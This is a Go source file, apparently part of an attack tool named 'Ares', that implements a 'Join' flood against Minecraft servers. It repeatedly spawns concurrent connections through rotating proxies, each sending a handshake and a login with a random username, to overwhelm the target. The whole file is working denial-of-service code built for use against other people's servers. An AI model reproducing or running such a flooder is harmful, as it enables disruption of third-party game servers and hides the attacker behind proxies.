package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Join struct {
	Config          *core.AttackConfig
	isRunnig        bool
	handshakePacket packet.Packet
}

func (j Join) Start() {
	ip, port, err := net.SplitHostPort(j.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}
	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)
	j.isRunnig = true
	done := make(chan struct{})
	for i := 0; i < j.Config.Loops; i++ {
		loop(&j, done)
	}
}

func loop(j *Join, done chan struct{}) {
	ticker := time.NewTicker(j.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < j.Config.PerDelay; i++ {
				go connect(j)
			}
		case <-done:
			return
		}
	}
}

func connect(j *Join) error {
	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
	if err != nil {
		return err
	}

	conn.WritePacket(j.handshakePacket)
	conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), j.Config.Version))

	defer conn.Close()
	return nil
}

func (j Join) Stop() {
	j.isRunnig = false
}
